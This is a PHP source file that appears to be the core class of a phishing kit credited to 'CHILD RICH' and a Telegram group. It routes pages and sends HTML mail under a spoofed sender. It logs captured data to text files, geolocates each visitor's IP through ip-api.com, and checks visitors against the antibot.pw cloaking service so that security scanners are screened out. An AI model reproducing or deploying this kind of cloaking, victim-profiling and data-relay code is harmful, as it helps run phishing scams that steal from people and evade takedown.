<?php
/*   __________________________________________________
    |                  CHILD RICH                      |
    |            on 2024-09-23 20:05:17                |
    |    Group : https://t.me/childrichgroup           |
    |__________________________________________________|
*/
<?php
ini_set('memory_limit', '2G');

class RequestHandler {
    private $pageLoader;
    private $viewsPath = 'App/System/';
    public $visitorPath = 'App/Visitor/';
    public $pagePath = 'App/Views';
    private $installFile = 'App/System/installed.lock';
    public $namasc = 'CHILD RICH';

    public function __construct() {
        $this->pageLoader = new PageLoader();
    }

    public function processRequest() {
        $uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
        $segments = explode('/', trim($uri, '/'));
        $queryParams = $_GET;
        $page = isset($segments[0]) ? $segments[0] : 'home';
        $this->pageLoader->loadPage($page, $queryParams);
    }

    public function sendEmail($to, $subject, $content, $nameemail) {
        $headers = "From: $nameemail <melnais@melnaisworld.gg>\r\n";
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
        return mail($to, $subject, $content, $headers);
    }
    
    public function terminateApp($pesan) {
        require_once 'Prosess/404.php';
        exit;
    }

    public function isInstalled() {
        return file_exists($this->installFile);
    }

    public function _url() 
    {
        $base_url = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == "on") ? "https" : "http");
        $base_url .= "://". @$_SERVER['HTTP_HOST'];
        $base_url .= str_replace(basename($_SERVER['SCRIPT_NAME']), "", $_SERVER['SCRIPT_NAME']);
    
        return $base_url;
    }

    public function getLanguageData($languageCode) {
        $jsonData = file_get_contents($this->viewsPath. 'bahasa.json');
        $data = json_decode($jsonData, true);

        if (isset($data[$languageCode])) {
            return $data[$languageCode];
        } else {
            return isset($data['default']) ? $data['default'] : "Language not found.";
        }
    }

    public function logstoText($name,$data) {
    $logFile = $name.'.txt';
    $logData = date('Y-m-d H:i:s') . "|" . $data . "|MELNAISWORLD\n";
    file_put_contents($logFile, $logData, FILE_APPEND);
    }

    public function write($filename, $mode, $data) 
    {
    $fp = @fopen($filename, $mode);
    @fwrite($fp, $data);
    @fclose($fp);
    }

    public function getPublicIP()
    {
        if (isset($_SERVER['HTTP_CLIENT_IP']) && $_SERVER['HTTP_CLIENT_IP'] != '') {
        $ip_address = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && $_SERVER['HTTP_X_FORWARDED_FOR'] != '') {
            $ip_address = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip_address = $_SERVER['REMOTE_ADDR'];
        }
        return $ip_address;
    }

    private function _geoGet($ip_address) 
    {
        $url = "http://ip-api.com/json/" . $ip_address;
        
        $ch = curl_init(); 
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
        
        $response = curl_exec($ch);
        if (curl_errno($ch)) {
            echo 'Curl error: ' . curl_error($ch); 
            curl_close($ch); 
            return null;
        }
        curl_close($ch);

        return json_decode($response, true);
    }

    public function waktu() 
    {
        $timezone = new DateTimeZone('Asia/Jakarta');
        $date = new DateTime();
        $date->setTimeZone($timezone);
        $time = $date->format('H:i A');
    
        return $time;
    }

    public function tanggal()
    {
        $timezone = new DateTimeZone('Asia/Jakarta');
        $date = new DateTime();
        $date->setTimeZone($timezone);
        $fullday = $date->format('H:i A - D, d M Y');
    
        return $fullday;
    }

    public function getdata($name) 
    {
        $get = json_decode(file_get_contents($this->viewsPath . "data.json"), 1);
        return $get[$name];
    }

    public function resultdat($name, $ip_address) 
    {
        $filePath = $this->visitorPath . 'geo_data_' . $ip_address . '.json';
        
        if (!file_exists($filePath)) {
            $geoData = $this->_geoGet($ip_address);
            
            if ($geoData === null) {
                return null; 
            }
            
            file_put_contents($filePath, json_encode($geoData));
        } else {
            $jsonContent = file_get_contents($filePath);
            $geoData = json_decode($jsonContent, true);
        }

        return isset($geoData[$name]) ? $geoData[$name] : null;
    }

    public function antibot($ip, $useragent) {
        $key = $this->getdata('antibot');
        $ch = curl_init();
        
        curl_setopt($ch, CURLOPT_USERAGENT, "Antibot Blocker");
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL, "https://antibot.pw/api/v2-blockers?ip=" . urlencode($ip) . "&apikey=" . urlencode($key) . "&ua=" . urlencode($useragent));
        
        $data = curl_exec($ch);
        if (curl_errno($ch)) {
            curl_close($ch);
            return false;
        }
    
        curl_close($ch);
        
        $check = json_decode($data, true);
        if (isset($check['is_bot']) && $check['is_bot'] === true) {
            return true;
        }
        
        return false;
    }
    
}
